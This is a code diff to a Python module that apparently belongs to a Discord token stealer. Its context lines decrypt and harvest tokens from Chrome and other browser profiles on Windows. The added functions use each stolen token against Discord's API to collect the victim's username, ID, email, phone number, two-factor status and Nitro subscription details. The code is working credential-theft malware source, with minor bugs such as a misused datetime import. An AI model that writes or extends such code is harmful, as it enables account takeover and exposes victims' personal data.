@@ -2,11 +2,13 @@ from __future__ import annotations
 import os
 from base64 import b64decode
 from win32crypt import CryptUnprotectData
+import datetime
 from os import listdir
 from json import loads
 from Crypto.Cipher import AES
 from typing import Any
 from re import findall
+from requests import get
 from __init__ import local, roaming
 
 userPath = os.path.expanduser("~")
@@ -21,6 +23,7 @@ def get_tokens() -> list[Any]:
                 buff[15:])[:-16].decode()
         except:
             return 'Error'
+    
     def find_tokens():
         goodTokens = []
         chrome = local + '\\Google\\Chrome\\User Data'
@@ -85,3 +88,61 @@ def get_tokens() -> list[Any]:
 
         return goodTokens
     return find_tokens()
+
+def process_token(token: str):
+    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    try:
+        res = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+        if res.status_code == 200:
+            res_json = res.json()
+            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+            user_id = res_json['id']
+            email = res_json.get('email', None)
+            phone = res_json.get('phone', None)
+            mfa_enabled = res_json['mfa_enabled']
+            
+            res = get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+            nitro_data = res.json()
+            has_nitro = bool(len(nitro_data) > 0)
+
+            infos = {
+                "username": user_name,
+                "userid": user_id,
+                "email": email,
+                "phone": phone,
+                "twofa": mfa_enabled,
+                "hasnitro": has_nitro
+            }
+            
+            if has_nitro:
+                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                days_left = abs((d1 - d2).days)
+                infos["days_left"] = days_left
+
+            return infos
+
+    except Exception as e:
+        pass
+    
+    return None
+
+def get_common_infos(tokens: list[str]):
+    if len(tokens) < 1:
+        return
+
+    if len(tokens) == 1:
+        infos = process_token(tokens[0])
+    else:
+        infos_list = []
+        already_checked = set()
+
+        for token in tokens:
+            if token not in already_checked:
+                already_checked.add(token)
+                infos = process_token(token)
+            
+                if infos:
+                    infos_list.append(infos)
+        
+        return infos_list
